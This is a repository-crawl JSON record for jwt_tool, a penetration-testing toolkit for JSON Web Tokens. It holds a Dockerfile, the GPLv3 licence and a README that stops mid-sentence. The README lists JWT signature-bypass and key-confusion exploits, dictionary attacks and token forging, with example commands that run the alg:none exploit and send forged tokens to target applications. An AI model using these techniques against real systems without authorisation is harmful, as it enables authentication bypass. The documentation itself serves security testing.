{
  "metadata": {
    "timestamp": 1736560949478,
    "page": 695,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "ticarpi/jwt_tool",
      "stars": 5541,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.185546875,
          "content": "ï»¿FROM python:3.8-alpine\nWORKDIR /opt\nCOPY . /opt/jwt_tool\nWORKDIR /opt/jwt_tool\nRUN apk add gcc musl-dev\nRUN python3 -m pip install -r requirements.txt\nENTRYPOINT [\"python3\",\"jwt_tool.py\"]"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3251953125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<https://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<https://www.gnu.org/licenses/why-not-lgpl.html>.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 10.55078125,
          "content": "# The JSON Web Token Toolkit v2\n>*jwt_tool.py* is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).  \n\n![jwt_tool version](https://img.shields.io/badge/version-v2.2.7-blue) ![python version](https://img.shields.io/badge/python-v3.6+-green)\n\n![logo](https://user-images.githubusercontent.com/19988419/100555535-18598280-3294-11eb-80ed-ca5a0c3455d6.png)\n\nIts functionality includes:\n* Checking the validity of a token\n* Testing for known exploits:\n  * (CVE-2015-2951) The ***alg=none*** signature-bypass vulnerability\n  * (CVE-2016-10555) The ***RS/HS256*** public key mismatch vulnerability\n  * (CVE-2018-0114) ***Key injection*** vulnerability\n  * (CVE-2019-20933/CVE-2020-28637) ***Blank password*** vulnerability\n  * (CVE-2020-28042) ***Null signature*** vulnerability\n* Scanning for misconfigurations or known weaknesses\n* Fuzzing claim values to provoke unexpected behaviours\n* Testing the validity of a secret/key file/Public Key/JWKS key\n* Identifying ***weak keys*** via a High-speed ***Dictionary Attack***\n* Forging new token header and payload contents and creating a new signature with the **key** or via another attack method\n* Timestamp tampering\n* RSA and ECDSA key generation, and reconstruction (from JWKS files)\n* ...and lots more!\n\n---\n\n## Audience\nThis tool is written for **pentesters**, who need to check the strength of the tokens in use, and their susceptibility to known attacks. A range of tampering, signing and verifying options are available to help delve deeper into the potential weaknesses present in some JWT libraries.  \nIt has also been successful for **CTF challengers** - as CTFs seem keen on JWTs at present.  \nIt may also be useful for **developers** who are using JWTs in projects, but would like to test for stability and for known vulnerabilities when using forged tokens.\n\n---\n\n## Requirements\nThis tool is written natively in **Python 3** (version 3.6+) using the common libraries, however various cryptographic funtions (and general prettiness/readability) do require the installation of a few common Python libraries.  \n*(An older Python 2.x version of this tool is available on the legacy branch for those who need it, although this is no longer be supported or updated)*\n\n---\n\n## Installation\n\n### Docker\nThe preferred usage for jwt_tool is with the [official Dockerhub-hosted jwt_tool docker image](https://hub.docker.com/r/ticarpi/jwt_tool)  \nThe base command for running this is as follows:  \nBase command for running jwt_tool:  \n`docker run -it --network \"host\" --rm -v \"${PWD}:/tmp\" -v \"${HOME}/.jwt_tool:/root/.jwt_tool\" ticarpi/jwt_tool`  \n\nBy using the above command you can tag on any other arguments as normal.  \nNote that local files in your current working directory will be mapped into the docker container's /tmp directory, so you can use them using that absolute path in your arguments.  \ni.e.  \n*/tmp/localfile.txt*\n\n### Manual Install\nInstallation is just a case of downloading the `jwt_tool.py` file (or `git clone` the repo).  \n(`chmod` the file too if you want to add it to your *$PATH* and call it from anywhere.)\n\n`$ git clone https://github.com/ticarpi/jwt_tool`  \n`$ python3 -m pip install -r requirements.txt`  \n\nOn first run the tool will generate a config file, some utility files, logfile, and a set of Public and Private keys in various formats.  \n\n### Custom Configs\n* To make best use of the scanning options it is **strongly advised** to copy the custom-generated JWKS file somewhere that can be accessed remotely via a URL. This address should then be stored in `jwtconf.ini` as the \"jwkloc\" value.  \n* In order to capture external service interactions - such as DNS lookups and HTTP requests - put your unique address for Burp Collaborator (or other alternative tools such as RequestBin) into the config file as the \"httplistener\" value.  \n***Review the other options in the config file to customise your experience.***\n\n### Colour bug in Windows\nTo fix broken colours in Windows cmd/Powershell: uncomment the below two lines in `jwt_tool.py` (remove the \"# \" from the beginning of each line)  \nYou will also need to install colorama: `python3 -m pip install colorama`\n```\n# import colorama\n# colorama.init()\n```\n---\n\n## Usage\nThe first argument should be the JWT itself (*unless providing this in a header or cookie value*). Providing no additional arguments will show you the decoded token values for review.  \n`$ python3 jwt_tool.py <JWT>`  \nor the Docker base command:  \n`$ docker run -it --network \"host\" --rm -v \"${PWD}:/tmp\" -v \"${HOME}/.jwt_tool:/root/.jwt_tool\" ticarpi/jwt_tool`  \n\nThe toolkit will validate the token and list the header and payload values.  \n\n### Additional arguments\nThe many additional arguments will take you straight to the appropriate function and return you a token ready to use in your tests.  \nFor example, to tamper the existing token run the following:  \n`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -T`  \n\nMany options need additional values to set options.  \nFor example, to run a particular type of exploit you need to choose the eXploit (-X) option and select the vulnerability (here using \"a\" for the *alg:none* exploit):  \n`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X a`\n\n### Extra parameters\nSome options such as Verifying tokens require additional parameters/files to be provided (here providing the Public Key in PEM format):  \n`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -V -pk public.pem`  \n\n### Sending tokens to a web application\nAll modes now allow for sending the token directly to an application.  \nYou need to specify:  \n* target URL (-t)\n* a request header (-rh) or request cookies (-rc) that are needed by the application (***at least one must contain the 